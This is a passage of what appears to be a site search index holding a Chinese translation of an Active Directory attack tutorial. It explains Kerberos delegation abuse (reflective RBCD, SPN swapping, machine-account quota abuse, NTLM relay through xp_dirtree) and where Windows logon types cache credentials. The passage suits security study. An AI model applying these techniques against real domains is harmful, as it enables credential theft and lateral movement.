MSSQL\u670d\u52a1\u5668\u9664\u4e86\u5305\u542b\u654f\u611f\u6570\u636e\u5916\uff0c\u8fd8\u53ef\u4ee5\u5141\u8bb8\u7528\u6237\u901a\u8fc7xp_cmdshell\u547d\u4ee4\u6267\u884c\u547d\u4ee4\uff0c\u901a\u8fc7xp_dirtree\u5411WebDAV\u670d\u52a1\u5668\u6267\u884cHTTP\u8bf7\u6c42\u6765\u6ee5\u7528NTLM\u4e2d\u7ee7\uff0c\u4ee5\u53ca\u5176\u4ed6\u8bb8\u591a\u9009\u9879\u3002</li> <li>krbtgt\u670d\u52a1\uff1a \u5982\u679c\u4e00\u4e2a\u8d26\u6237\u88ab\u5141\u8bb8\u59d4\u6d3e\u7ed9krbtgt\u670d\u52a1\uff0c\u5b83\u53ef\u4ee5\u4e3a\u4efb\u4f55\u88ab\u5141\u8bb8\u5192\u5145\u7684\u8d26\u6237\u8bf7\u6c42TGT\u3002</li> </ul> <p>\u8bf7\u8bb0\u4f4f\uff0c\u5373\u4f7f\u4f60\u4e0d\u88ab\u5141\u8bb8\u901a\u8fc7\u7ecf\u5178\u7ea6\u675f\u59d4\u6d3e\uff08ms-AllowedToDelegateTo\u5c5e\u6027\uff09\u76f4\u63a5\u59d4\u6d3e\u7ed9\u8fd9\u4e9b\u670d\u52a1\u4e4b\u4e00\uff0c\u800c\u662f\u59d4\u6d3e\u7ed9\u540c\u540c\u4e00\u7528\u6237\u7684\u4e00\u4e2a\u670d\u52a1\uff0c\u4e5f\u53ef\u4ee5\u6539\u53d8\u7968\u8bc1\u4e2d\u7684\u76ee\u6807\u670d\u52a1\u3002\u4f8b\u5982\uff0c\u5982\u679c\u4f60\u88ab\u5141\u8bb8\u59d4\u6d3e\u7ed9\u4e00\u53f0\u8ba1\u7b97\u673a\u7684HTTP\u670d\u52a1\uff0c\u4f8b\u5982HTTP/websrv\uff0c\u5c31\u53ef\u4ee5\u5c06\u76ee\u6807\u670d\u52a1\u6539\u4e3aCIFS/websrv\u6765\u8bbf\u95ee\u8be5\u8ba1\u7b97\u673a\uff08\u5982\u679cHTTP\u670d\u52a1\u662f\u5728\u8ba1\u7b97\u673a\u8d26\u6237\u7684\u4e0a\u4e0b\u6587\u4e2d\u6267\u884c\u7684\u8bdd\uff09\u3002\u53e6\u5916\uff0c\u5982\u679c\u4f60\u53ef\u4ee5\u59d4\u6d3eDC\u7684\u4efb\u4f55\u670d\u52a1\uff0c\u5c31\u80fd\u8bbe\u6cd5\u6539\u53d8\u7968\u8bc1\u670d\u52a1\uff0c\u5e76\u7528\u5b83\u6765\u8bbf\u95eeLDAP\u670d\u52a1\u3002</p> <p>\u4e3a\u4e86\u4ee5\u7528\u6237\u7684\u8eab\u4efd\u6765\u4f7f\u7528\u670d\u52a1\uff0c\u9700\u8981\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u59d4\u6d3e\uff08RBCD\uff09\u6216\u652f\u6301\u534f\u8bae\u8f6c\u6362\u7684\u7ecf\u5178\u7ea6\u675f\u59d4\u6d3e\uff08S4U2self\uff09\u3002</p> <p>\u4f60\u53ef\u4ee5\u901a\u8fc7\u83b7\u53d6\u5bf9\u8d26\u6237ms-AllowedToActOnBehalfOfOtherIdentity\u5c5e\u6027\u7684\u5199\u5165\u6743\u9650\uff0c\u4f7f\u5176\u6307\u5411\u81f3\u5c11\u542b\u6709\u4e00\u9879\u670d\u52a1\u7684\u8d26\u6237\uff08\u4e3a\u4e86\u4f7f\u7528S4U2self\uff09\uff0c\u6765\u4e3a\u8d26\u6237\u542f\u7528RBCD\u3002</p> <p>\u5982\u679c\u60a8\u6ca1\u6709\u81f3\u5c11\u5177\u6709\u4e00\u9879\u670d\u52a1\u7684\u5e10\u6237\uff0c\u5219\u53ef\u4ee5\u901a\u8fc7\u6ee5\u7528\u8ba1\u7b97\u673a\u914d\u989d\u521b\u5efa\u4e00\u4e2a\u8ba1\u7b97\u673a\u5e10\u6237\uff0c\u56e0\u4e3a\u5728\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u8ba1\u7b97\u673a\u914d\u989d\u5141\u8bb8\u7528\u6237\u5728\u57df\u4e0a\u6700\u591a\u521b\u5efa10\u4e2a\u8ba1\u7b97\u673a\u5e10\u6237\u3002\u8fd9\u9879\u4efb\u52a1\u53ef\u4ee5\u7528Powermad\u6216impacket addcomputer.py\u6765\u5b8c\u6210\u3002\u4e00\u65e6\u521b\u5efa\u4e86\u8ba1\u7b97\u673a\u5e10\u6237\uff08\u7528\u6237\u53ef\u4ee5\u9009\u62e9\u8ba1\u7b97\u673a\u5e10\u6237\u7684\u5bc6\u7801\uff09\uff0c\u521b\u5efa\u8be5\u5e10\u6237\u7684\u7528\u6237\u5c31\u53ef\u4ee5\u4e3a\u5176\u5206\u914d\u670d\u52a1\u3002\u8fd9\u6837\uff0c\u60a8\u53ef\u4ee5\u83b7\u5f97\u4e00\u4e2a\u5177\u6709\u5404\u79cd\u670d\u52a1\u7684\u5e10\u6237\u4e86\u3002</p> <p>\u6b64\u5916\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u5e10\u6237\u6709\u6743\u7f16\u8f91\u81ea\u5df1\u7684MS-AllowedToActonBeHalfOtherIdentity\u5c5e\u6027\u3002\u56e0\u6b64\uff0c\u5982\u679c\u60a8\u80fd\u591f\u83b7\u5f97\u8ba1\u7b97\u673a\u5e10\u6237\u7684\u51ed\u636e\uff08\u5982NT\u54c8\u5e0c\u503c\u3001Kerberos\u5bc6\u94a5\u6216TGT)\uff0c\u5219\u53ef\u4ee5\u4e3a\u8be5\u8ba1\u7b97\u673a\u7684\u4efb\u610f\u7528\u6237\u542f\u7528RBCD\u3002\u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528RBCD\u6765\u5192\u5145\u8ba1\u7b97\u673aCIFS(SMB)\u670d\u52a1\u7684\u7ba1\u7406\u5458\uff0c\u4ece\u800c\u62ff\u4e0b\u76f8\u5e94\u7684\u8ba1\u7b97\u673a\u3002</p> <p>\u5b9e\u9645\u4e0a\uff0c\u7531\u4e8e\u60a8\u638c\u63e1\u4e86\u8ba1\u7b97\u673a\u5e10\u6237\u51ed\u636e\uff0c\u56e0\u6b64\u4e5f\u53ef\u4ee5\u4e3a\u81ea\u5df1\u542f\u7528RBCD\uff08\u53cd\u5c04\u578bRBCD\uff09\u3002\u8fd9\u6837\uff0c\u60a8\u53ea\u9700\u8981\u4f7f\u7528S4U2self\u6765\u8bf7\u6c42\u8ba1\u7b97\u673aCIFS\u670d\u52a1\u7684\u7968\u8bc1\uff0c\u5c31\u80fd\u83b7\u5f97\u76f8\u5e94\u7684ST\uff0c\u4e4b\u540e\u5c31\u53ef\u4ee5\u901a\u8fc7\u5b83\u6765\u5165\u4fb5\u4e3b\u673a\u4e86\u3002\u8fd9\u79cd\u65b9\u6cd5\u751a\u81f3\u53ef\u4ee5\u5192\u5145\u53d7\u4fdd\u62a4\u7684\u7528\u6237\u5e10\u6237\u3002\u6709\u65f6\u5019\uff0c\u8fd9\u79cd\u65b9\u6cd5\u975e\u5e38\u6709\u7528\uff0c\u56e0\u4e3a\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u57df\u8ba1\u7b97\u673a\u5e10\u6237\u5e76\u6ca1\u6709\u4ee5\u7ba1\u7406\u5458\u8eab\u4efd\u8fdc\u7a0b\u8bbf\u95ee\u8ba1\u7b97\u673a\u672c\u8eab\u7684\u6743\u9650\u3002</p> <p><code>.----------------------1) LDAP (modify websrv$) --------------------.                                                       |      + msds-AllowedToActOnBehalfOfOtherIdentity = [\"websrv$\"]     |    |                                                                   v    |     .----------------2) TGS-REQ---------------------------.      .---.    ^     |              + SPN: CIFS/websrv                     |     /   /|    o  &gt;--'              + For user: admin                      '--&gt; .---. |   /|\\                   + TGT websrv$                               |   | '   / \\                                                               |   |/  websrv$ &lt;-----------------3) TGS-REP------------------------------&lt; '---'      v                  + ST admin &gt; CIFS/websrv                       DC (KDC)    |    |                                        .---.    |                                       /   /|    '---------4) AP-REQ------------------&gt; .---. |          + ST admin &gt; CIFS/websrv         |   | '                                           |   |/                                            '---'                                             websrv</code></p> <p>\u53cd\u5c04\u578bRBCD\u653b\u51fb</p> <p>\u5c3d\u7ba1\u5982\u6b64\uff0c\u5728\u5165\u4fb5\u673a\u5668\u4e4b\u524d\u83b7\u5f97\u8ba1\u7b97\u673a\u51ed\u636e\u662f\u5f88\u68d8\u624b\u7684\uff08\u4e5f\u8bb8\u53ef\u4ee5\u7528\u65e0\u7ea6\u675f\u59d4\u6d3e\uff1f\uff09\uff0c\u4f46\u5982\u679c\u80fd\u5f3a\u8feb\u8ba1\u7b97\u673a\u5411\u5904\u4e8e\u81ea\u5df1\u63a7\u5236\u4e0b\u7684\u4e3b\u673a\u53d1\u9001\u7ecf\u8fc7NTLM\u8eab\u4efd\u9a8c\u8bc1\u7684HTTP\u8bf7\u6c42\uff0c\u5c31\u80fd\u5b9e\u73b0\u4eceHTTP\u5230LDAP\u7684\u8de8NTLM\u4e2d\u7ee7\u653b\u51fb\uff0c\u4ee5\u4fbf\u5c06\u8ba1\u7b97\u673a\u5e10\u6237\u7684RBCD\u542f\u7528\u5230\u60a8\u63a7\u5236\u7684\u5e10\u6237\u3002</p> <p>\u4e3a\u4e86\u4f7f\u7528\u8fd9\u4e2a\u539f\u8bed\uff0c\u53ef\u4ee5\u5229\u7528Windows\u684c\u9762\u4e0a\u9ed8\u8ba4\u5b89\u88c5\u7684WebDAV\u5ba2\u6237\u7aef\u3002\u4f8b\u5982\uff0c\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528MSSQL\u6570\u636e\u5e93\u7684xp_dirtree\u8fc7\u7a0b\u6765\u89e6\u53d1\u7ecf\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u7684HTTP\u8bf7\u6c42\uff08\u4e3a\u6b64\uff0c\u53ef\u4ee5\u501f\u52a9\u4e8ebad_sequel.py\u811a\u672c\uff09\u3002</p> <p>\u4f46\u662f\uff0c\u8fd9\u53ef\u80fd\u4f1a\u7834\u574f\u5177\u6709\u672a\u542f\u7528\u534f\u8bae\u8f6c\u6362 (S4U2self) \u7684\u7ecf\u5178\u7ea6\u675f\u59d4\u6d3e\u7684\u5e10\u6237\uff0c\u8fd9\u6837\u4e00\u6765\uff0c\u5c31\u65e0\u6cd5\u4e3a\u4efb\u4f55\u7528\u6237\u7d22\u53d6\u7968\u8bc1\u4e86\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u4f7f\u7528RBCD\u6765\u6a21\u4eff\u534f\u8bae\u8f6c\u6362\u3002\u8fd9\u610f\u5473\u7740\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u88ab\u653b\u51fb\u7684\u8d26\u6237\uff08\u5177\u6709\u7ecf\u5178\u7ea6\u675f\u59d4\u6d3e\u7684\u8d26\u6237\uff09\u542f\u7528\u53e6\u4e00\u4e2a\u8d26\u6237\u7684RBCD\uff0c\u8fd9\u6837\u5176\u4ed6\u8d26\u6237\u5c31\u53ef\u4ee5\u4e3a\u4efb\u4f55\u7528\u6237\u5411\u88ab\u653b\u51fb\u7684\u8d26\u6237\u7d22\u53d6\u7968\u8bc1\uff0c\u5b83\u5e94\u8be5\u662f\u53ef\u8f6c\u53d1\u7684\uff0c\u56e0\u4e3a\u5b83\u662f\u7531S4U2proxy\u751f\u6210\u7684\uff08\u867d\u7136\u76f8\u5173\u89c4\u8303\u5df2\u7ecf\u66f4\u65b0\uff0c\u4f46\u8fd9\u4e2a\u4e8b\u5b9e\u4f3c\u4e4e\u4ecd\u7136\u6ca1\u6709\u53d8\u5316\uff09\uff0c\u8fd9\u79cd\u65b9\u5f0f\u5b9e\u9645\u4e0a\u5c31\u662f\u5bf9\u534f\u8bae\u8f6c\u6362\u7684\u6a21\u4eff\u3002</p> <p>\u8fd9\u4e2a\u65b9\u6cd5\u8c8c\u4f3c\u6709\u70b9\u590d\u6742\uff0c\u6240\u4ee5\u8ba9\u6211\u4eec\u4e3e\u4e2a\u4f8b\u5b50\uff1a\u5047\u8bbedbsrv\u88ab\u5165\u4fb5\u4e86\uff0c\u5e76\u4e14\u542f\u7528\u4e86\u7ecf\u5178\u7ea6\u675f\u59d4\u6d3e\uff0c\u4f46\u6ca1\u6709\u542f\u7528\u534f\u8bae\u8f6c\u6362\u3002\u7136\u800c\uff0cwebsrv\u4e5f\u88ab\u5165\u4fb5\u4e86\uff0c\u5e76\u4e14\u53ef\u4ee5\u88ab\u7528\u4e8eRBCD\u534f\u8bae\u8f6c\u6362\u3002\u7136\u540e\uff0c\u542f\u7528\u4ecewebsrv\u5230dbsrv\u7684RBCD\uff0c\u5e76\u4f7f\u7528websrv\u6a21\u62df\u534f\u8bae\u8f6c\u6362\uff0c\u6700\u540e\u5f97\u5230\u4e00\u4e2a\u7ba1\u7406\u5458ST\uff0c\u8fd9\u6837\uff0c\u5c31\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u5217\u65b9\u5f0f\u6765\u5165\u4fb5filesrv\u4e86\u3002</p> <pre><code>                                    `KDC    .-------1) TGS-REQ--&gt;&gt;------------&gt; .---. &lt;----6) TGS-REQ----&lt;&lt;------------.      |    + SPN: HTTP/websrv            /   /| + SPN: CIFS/filesrv              |    |    + For user: admin            .---. | + TGT dbsrv$                     |    |    + TGT websrv$                |   | ' + ST(F) admin &gt; MSSQLSvc/dbsrv   |    |                                 |   |/                                   |    |  .----2) TGS-REP--&lt;&lt;----------&lt; '---' &gt;------7) TGS-REP----&gt;&gt;--------.   |                 |  | + ST admin &gt; HTTP/websrv     ^   v   + ST admin &gt; CIFS/filesrv    |   |    |  |                              |   |                                |   |    |  |                              |   |                                |   |    |  |                              |   |                                |   |    ^  v                              |   |                                |   |    .---. &gt;--------3) TGS-REQ----&gt;&gt;---'   |                                |   |   /   /|  + SPN: MSSQLSvc/dbsrv          |                                |   |  .---. |  + TGT websrv$                  |                                |   |  |   | '  + ST admin &gt; HTTP/websrv       |                                |   |  |   |/                                  |                                |   |  '---' &lt;----------4) TGS-REP----&lt;&lt;-------'                                v   ^  websrv  + ST(F) admin &gt; MSSQLSvc/dbsrv                                   .---.     v                                                                     /   /|      |                                                                    .---. |     '------------------5) Send the ticket-----&gt;&gt;&gt;&gt;---------------------&gt; |   | '                                           + ST(F) admin &gt; MSSQLSvc/dbsrv                      |   |/                                                                           '---'                                                                            dbsrv                                      .---.                                  v                                  /   /|                                  |                                 .---. | &lt;--8) AP-REQ---&lt;&lt;----------------'                                 |   | '  + ST admin &gt; CIFS/filesrv                                 |   |/                                  '---'                                   filesrv`\n</code></pre> <p>\u5c06RBCD\u4f5c\u4e3a\u534f\u8bae\u8f6c\u6362\u4f7f\u7528</p> <p>\u5728\u524d\u56db\u4e2a\u6b65\u9aa4\u4e2d\uff0cwebsrv\u4f7f\u7528S4U2self\u548cS4U2proxy\u4e3a\u7ba1\u7406\u5458\u83b7\u53d6\u4e00\u4e2a\u53ef\u8f6c\u53d1\u7684MSSQLSvc/dbsrv ST\uff0c\u4ece\u800c\u6a21\u62df\u534f\u8bae\u8f6c\u6362\u3002\u7136\u540e\uff0cwebsrv\u5c06\u8fd9\u4e2a\u7ba1\u7406\u5458ST\u53d1\u9001\u7ed9dbsrv\uff0c\u800cdbsrv\u5219\u5c06\u5176\u7528\u4e8eS4U2proxy\uff0c\u5e76\u4e3a\u7ba1\u7406\u5458\u8bf7\u6c42\u4e00\u4e2aCIFS/filesrv ST\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u5165\u4fb5filesrv\u4e86\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#logon-types","title":"Logon types","text":"<p>\u4e3a\u4e86\u5728\u672c\u5730\u548c\u8fdc\u7a0b\u767b\u5f55\u7528\u6237\u8d26\u6237\uff0cWindows\u5b9a\u4e49\u4e86\u591a\u79cd\u4e0d\u540c\u7684\u767b\u5f55\u7c7b\u578b\uff1b\u5bf9\u4e8e\u653b\u51fb\u8005\u6765\u8bf4\uff0c\u719f\u6089\u8fd9\u4e9b\u767b\u9646\u65b9\u5f0f\u662f\u5f88\u91cd\u8981\u7684\uff0c\u539f\u56e0\u5982\u4e0b\uff1a\u9996\u5148\uff0c\u4e0d\u662f\u6240\u6709\u7684\u767b\u5f55\u65b9\u5f0f\u90fd\u53ef\u4ee5\u4f9b\u4efb\u4f55\u7528\u6237\u4f7f\u7528\uff0c\u6240\u4ee5\uff0c\u653b\u51fb\u8005\u9700\u8981\u77e5\u9053\u81ea\u5df1\u80fd\u591f\u4f7f\u7528\u54ea\u79cd\u767b\u9646\u65b9\u5f0f\u3002\u5176\u6b21\uff0c\u8bb8\u591a\u767b\u5f55\u65b9\u5f0f\u4f1a\u5728lsass\u8fdb\u7a0b\u4e2d\u6216\u751a\u81f3\u5728LSA\u673a\u5bc6\u4e2d\u7f13\u5b58\u51ed\u636e\uff0c\u800c\u653b\u51fb\u8005\u53ef\u8bbe\u6cd5\u7834\u89e3\u5b83\u4eec\uff0c\u56e0\u6b64\uff0c\u8bc6\u522b\u81ea\u5df1\u767b\u5f55\u65f6\u4f7f\u7528\u7684\u662f\u54ea\u79cd\u65b9\u5f0f\u662f\u975e\u5e38\u91cd\u8981\u7684\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#interactive-logon","title":"Interactive logon","text":"<p>\u5728\u7269\u7406\u673a\u4e0a\u767b\u5f55\uff0c\u6216\u4f7f\u7528runas\u65f6\uff0c\u901a\u5e38\u4f1a\u91c7\u7528\u4ea4\u4e92\u5f0f\u767b\u5f55\u6216\u672c\u5730\u767b\u5f55\u65b9\u5f0f\u3002\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u51ed\u636e\u4f1a\u88ab\u7f13\u5b58\u5728\u673a\u5668\u7684lsass\u8fdb\u7a0b\u4e2d\u3002</p> <p></p> <p>\u4ea4\u4e92\u5f0f\u767b\u5f55</p> <p><code>runas /user:&lt;username&gt; cmd</code></p> <p>\u4f7f\u7528runas\u8fdb\u884c\u4ea4\u4e92\u5f0f\u767b\u5f55</p> <p>\u5728\u8fd9\u79cd\u7c7b\u578b\u7684\u767b\u5f55\u4e2d\uff0c\u5982\u679c\u662f\u672c\u5730\u8d26\u6237\uff0c\u8ba1\u7b97\u673a\u4f1a\u7528\u5176NT\u54c8\u5e0c\u503c\u4e0e\u5b58\u50a8\u5728SAM\u4e2d\u7684\u5bc6\u7801\u8fdb\u884c\u6838\u5bf9\u3002\u5982\u679c\u7528\u6237\u4f7f\u7528\u7684\u662f\u57df\u8d26\u6237\uff0c\u8ba1\u7b97\u673a\u5c06\u901a\u8fc7\u7f13\u5b58\u5728\u8ba1\u7b97\u673a\u4e2d\u7684\u57df\u63a7\u5236\u5668\u67e5\u8be2Kerberos TGT\uff0c\u5e76\u901a\u8fc7\u5b83\u6765\u68c0\u67e5\u7528\u6237\u51ed\u636e\u3002\u5982\u679c\u65e0\u6cd5\u8bbf\u95ee\u57df\u63a7\u5236\u5668\uff0c\u8ba1\u7b97\u673a\u4f1a\u68c0\u67e5\u57df\u7f13\u5b58\u51ed\u636e\uff08DCC\uff09\u5b58\u50a8\u4e2d\u7684\u7528\u6237\u51ed\u636e\uff0c\u8be5\u5b58\u50a8\u4e2d\u7f13\u5b58\u4e86\u6700\u540e\u767b\u5f55\u673a\u5668\u7684\u57df\u7528\u6237\u7684\u51ed\u636e\u3002\u5982\u679c\u672a\u7f13\u5b58\u57df\u51ed\u636e\uff0c\u8ba1\u7b97\u673a\u5219\u65e0\u6cd5\u5bf9\u7528\u6237\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u3002</p> <p>\u4e00\u65e6\u901a\u8fc7\u8eab\u4efd\u9a8c\u8bc1\uff0c\u4ece\u5bc6\u7801\u6d3e\u751f\u7684NT\u54c8\u5e0c\u503c\u5c31\u4f1a\u5b58\u50a8\u5728lsass\u8fdb\u7a0b\u4e2d\u3002\u5bf9\u4e8e\u57df\u8d26\u6237\uff0cKerberos\u5bc6\u94a5\u4e5f\u662f\u4ece\u7528\u6237\u5bc6\u7801\u6d3e\u751f\u51fa\u6765\u7684\uff0c\u5e76\u4e14\u7968\u8bc1\u4e5f\u4f1a\u88ab\u7f13\u5b58\u8d77\u6765\uff0c\u4ee5\u63d0\u4f9bSSO\uff08\u5355\u70b9\u767b\u5f55\uff09\u7279\u6027\u3002\u5728\u8001\u5f0f\u8ba1\u7b97\u673a\u4e2d\uff0c\u751a\u81f3\u8fde\u5bc6\u7801\u4e5f\u4f1a\u4ee5\u660e\u6587\u5f62\u5f0f\u7f13\u5b58\u8d77\u6765\u3002</p> <p>\u4e3a\u4e86\u8fdb\u884c\u4ea4\u4e92\u5f0f\u767b\u5f55\uff0c\u901a\u5e38\u9700\u8981\u5177\u6709SeInteractiveLogonRight\u6743\u9650\uff0c\u7279\u522b\u662f\u5728\u57df\u63a7\u5236\u5668\u6216\u5176\u4ed6Windows\u670d\u52a1\u5668\u673a\u5668\u4e0a\u7684\u65f6\u5019\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#network-logon","title":"Network logon","text":"<p>\u5f53\u60a8\u4f7f\u7528SMB\u3001RPC\u3001SQL\u7b49\u975e\u4ea4\u4e92\u5f0f\u670d\u52a1\u8fde\u63a5\u5230\u8fdc\u7a0b\u8ba1\u7b97\u673a\u65f6\uff0c\u4f7f\u7528\u7684\u5c31\u662f\u7f51\u7edc\u767b\u5f55\u65b9\u5f0f\u3002\u5bf9\u4e8e\u8fd9\u79cd\u767b\u5f55\u65b9\u5f0f\uff0c\u60a8\u9700\u8981\u63d0\u4f9b\u5bc6\u7801\u3001NT\u54c8\u5e0c\u503c\u6216Kerberos\u7968\u8bc1\uff0c\u56e0\u6b64\uff0c\u8fd9\u4e9b\u51ed\u636e\u5f88\u5bb9\u6613\u53d7\u5230Pass-The-Hash\u3001Pass-The-Key\u6216Pass-The-Ticket\u653b\u51fb\u7684\u5f71\u54cd\u3002\u4e00\u4e2a\u91cd\u8981\u7684\u4e8b\u5b9e\u662f\uff0c\u9664\u975e\u542f\u7528\u4e86Kerberos\u59d4\u6d3e\uff0c\u5426\u5219\u51ed\u636e\u662f\u4e0d\u4f1a\u7f13\u5b58\u5728\u8fdc\u7a0b\u8ba1\u7b97\u673a\u4e2d\u7684\u3002</p> <p>\u5bf9\u4e8e\u653b\u51fb\u8005\u6765\u8bf4\uff0c\u8fd9\u79cd\u767b\u9646\u7c7b\u578b\u66f4\u52a0\u5e38\u7528\uff08\u6211\u7684\u610f\u601d\u662f\u6709\u610f\u8bc6\u5730\u4f7f\u7528\u7684\u767b\u9646\u65b9\u5f0f\uff0c\u56e0\u4e3a\u8fd9\u4e5f\u662f\u5408\u6cd5\u7528\u6237\u6700\u5e38\u7528\u7684\u767b\u5f55\u7c7b\u578b\uff0c\u56e0\u4e3a\u540c\u4e00\u4e2a\u57df\u4e2d\u7684\u8ba1\u7b97\u673a\u4e5f\u7ecf\u5e38\u76f8\u4e92\u8fde\u63a5\uff09\u3002</p> <p>PSECEC\u3001impacket\u5957\u4ef6\u548cPowershell remote\u4e5f\u4f7f\u7528\u8fd9\u79cd\u8eab\u4efd\u9a8c\u8bc1\u65b9\u5f0f\uff0c\u5373\u4f7f\u5b83\u4eec\u63d0\u4f9b\u4e86\u4ea4\u4e92\u5f0fshell\u3002</p> <p>\u4ee5\u4e0b\u662f\u4e00\u4e9b\u7f51\u7edc\u767b\u5f55\u7684\u793a\u4f8b\uff1a</p> <p><code>dir \\\\ws01-10\\Temp</code></p> <p>\u8bbf\u95ee\u5171\u4eab</p> <p><code>.\\PsExec.exe \\\\dc01 cmd</code></p> <p>\u6267\u884cPsExec</p> <p>\u5728\u8fd9\u79cd\u7c7b\u578b\u7684\u767b\u5f55\u4e2d\uff0c\u5ba2\u6237\u7aef\u5c06\u8fde\u63a5\u5230\u8fdc\u7a0b\u8ba1\u7b97\u673a\uff0c\u5e76\u4f7f\u7528SPNEGO\u534f\u5546\u8eab\u4efd\u9a8c\u8bc1\u534f\u8bae\uff0c\u6700\u540e\u786e\u5b9a\u4f7f\u7528Kerberos\u6216NTLM\u3002\u7531\u4e8e\u65e0\u8bba\u4f7f\u7528\u8fd9\u4e9b\u534f\u8bae\u4e2d\u7684\u4efb\u4f55\u4e00\u4e2a\uff0c\u7528\u6237\u7684\u51ed\u636e\u90fd\u4e0d\u4f1a\u76f4\u63a5\u53d1\u9001\uff0c\u56e0\u6b64\u5b83\u4eec\u5e76\u4e0d\u4f1a\u7f13\u5b58\u5728\u76ee\u6807\u673a\u5668\u4e2d\u3002\u5f53\u7136\uff0c\u8fd9\u91cc\u6709\u4e00\u79cd\u4f8b\u5916\uff0c\u90a3\u5c31\u662f\u542f\u7528\u4e86Kerberos\u59d4\u6d3e\u7684\u60c5\u51b5\u3002</p> <p>\u8bf7\u6ce8\u610f\uff0c\u5373\u4f7f\u60a8\u53ef\u4ee5\u4f7f\u7528\u7f51\u7edc\u767b\u5f55\uff0c\u4e5f\u53ef\u80fd\u6709\u8bb8\u591a\u539f\u56e0\u5bfc\u81f4\u65e0\u6cd5\u4f7f\u7528\u670d\u52a1\u3002\u7b2c\u4e00\u4e2a\u539f\u56e0\u662f\u9632\u706b\u5899\u62e6\u622a\u4e86\u4e0e\u8fdc\u7a0b\u670d\u52a1\u7684\u8fde\u63a5\uff0c\u7b2c\u4e8c\u4e2a\u539f\u56e0\u662f\u8bb8\u591a\u901a\u8fc7\u7f51\u7edc\u767b\u5f55\u53ef\u7528\u7684\u670d\u52a1\u53ea\u80fd\u7528\u4e8e\u7ba1\u7406\u5458\u3002</p> <p>\u4f8b\u5982\uff0c\u5373\u4f7f\u60a8\u53ef\u4ee5\u4f7f\u7528\u7f51\u7edc\u767b\u5f55\u8bbf\u95ee\u8fdc\u7a0b\u8ba1\u7b97\u673a\u7684\u67d0\u4e9b\u5171\u4eab\uff0c\u4ecd\u7136\u65e0\u6cd5\u4f7f\u7528PsExec\u6765\u542f\u52a8shell\uff0c\u56e0\u4e3a\u5b83\u9700\u8981\u8bbf\u95ee\u670d\u52a1\u7ba1\u7406\u5668\uff0c\u800c\u670d\u52a1\u7ba1\u7406\u5668\u53ea\u80fd\u7531\u7ba1\u7406\u5458\u8bbf\u95ee\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#batch-logon","title":"Batch logon","text":"<p>\u7528\u4e8e\u5728\u7528\u6237\u4e0a\u4e0b\u6587\u4e2d\u8fd0\u884c\u8ba1\u5212\u4efb\u52a1\u3002Microsoft\u6587\u6863\u6307\u51fa\uff0c\u4efb\u52a1\u7528\u6237\u7684\u5bc6\u7801\u662f\u5b58\u50a8\u5728LSA\u673a\u5bc6\u4e2d\u7684\uff0c\u4f46\u5b9e\u9645\u6d4b\u8bd5\u8868\u660e\uff0c\u65e0\u6cd5\u5c06\u5bc6\u7801\u5b58\u50a8\u5728LSA\u673a\u5bc6\u3002\u5b9e\u9645\u4e0a\uff0c\u6267\u884c\u4efb\u52a1\u65f6\uff0c\u51ed\u636e\u5c06\u7f13\u5b58\u5728lsass\u8fdb\u7a0b\u4e2d\u3002</p> <p><code>schtasks.exe /create /tn notepaddaily /tr notepad.exe /sc daily /ru CONTOSO\\TaskUser /rp task1234!</code></p> <p>\u4f7f\u7528\u7528\u6237\u51ed\u636e\u521b\u5efa\u4efb\u52a1</p> <p>\u8bf7\u6ce8\u610f\uff0c\u6279\u5904\u7406\u767b\u5f55\u662f\u5728\u6267\u884c\u4efb\u52a1\u65f6\u4ea7\u751f\u7684\uff0c\u800c\u4e0d\u662f\u5728\u521b\u5efa\u4efb\u52a1\u65f6\u4ea7\u751f\u7684\u3002\u56e0\u6b64\uff0c\u5373\u4f7f\u60a8\u62e5\u6709\u4f5c\u4e3a\u4efb\u52a1\u8fd0\u884c\u7684\u6743\u9650\uff08\u5982SeBatchLogonRight)\uff0c\u4ecd\u7136\u65e0\u6cd5\u521b\u5efa\u4efb\u52a1\u3002\u4f8b\u5982\uff0c\u5907\u4efd\u64cd\u4f5c\u5458\u867d\u7136\u5177\u6709SeBatchLogonRight\u6743\u9650\uff0c\u4f46\u4ed6\u4eec\u65e0\u6cd5\u521b\u5efa\u4efb\u52a1\uff08\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff09\u3002</p> 